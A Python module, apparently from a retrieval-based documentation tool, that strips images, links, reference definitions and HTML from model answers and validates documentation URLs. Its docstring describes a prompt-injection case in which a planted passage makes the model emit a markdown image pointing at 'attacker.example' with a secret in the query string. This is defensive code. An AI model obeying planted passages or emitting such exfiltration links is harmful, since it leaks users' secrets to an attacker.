"""
Output hardening for text that came from the model.

The model's answer is influenced by retrieved passages, and passages can be planted
(see doctrace/audit/injection_probe.py). A poisoned passage can make the model emit
markdown such as `![x](https://attacker.example/?q=<secret>)`; a renderer that
fetches images would then send data to the attacker without any click. Before an
answer is drawn as markdown, `sanitize_answer` removes anything that could load or
link to an external resource. Fenced code blocks are left untouched.
"""

import re

_FENCE_SPLIT = re.compile(r"(```.*?```)", re.S)
_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_LINK = re.compile(r"\[([^\]]*)\]\([^)]*\)")
_REF_DEF = re.compile(r"^[ \t]*\[[^\]]+\]:[ \t]*\S+.*$", re.M)
_HTML_TAG = re.compile(r"</?[a-zA-Z][^>\n]*>")


def _clean_prose(text: str) -> str:
    text = _IMAGE.sub("", text)
    text = _LINK.sub(r"\1", text)
    text = _REF_DEF.sub("", text)
    return _HTML_TAG.sub("", text)


def sanitize_answer(answer: str) -> str:
    """Strip images, links, reference definitions and HTML tags from prose, keeping
    link text and code fences."""
    parts = _FENCE_SPLIT.split(answer)
    return "".join(p if p.startswith("```") else _clean_prose(p) for p in parts)


def docs_url(source_path: str, anchor: str | None = None) -> str:
    """Public page for a source file such as 'tutorial/first-steps.md', deep-linked to
    `anchor` when one is given.

    Both values come from the corpus, which is third-party text, so anything that is not
    a plain relative markdown path or a simple slug is refused rather than placed in an
    href: that is where a `javascript:` or protocol-relative URL would land.
    """
    if not re.fullmatch(r"[\w\-./]+\.md", source_path) or ".." in source_path:
        return "https://fastapi.tiangolo.com/"
    page = source_path[:-3]
    if page.endswith("/index"):
        page = page[: -len("index")]
    url = f"https://fastapi.tiangolo.com/{page.rstrip('/')}/"
    if anchor and re.fullmatch(r"[\w-]+", anchor):
        url += f"#{anchor}"
    return url
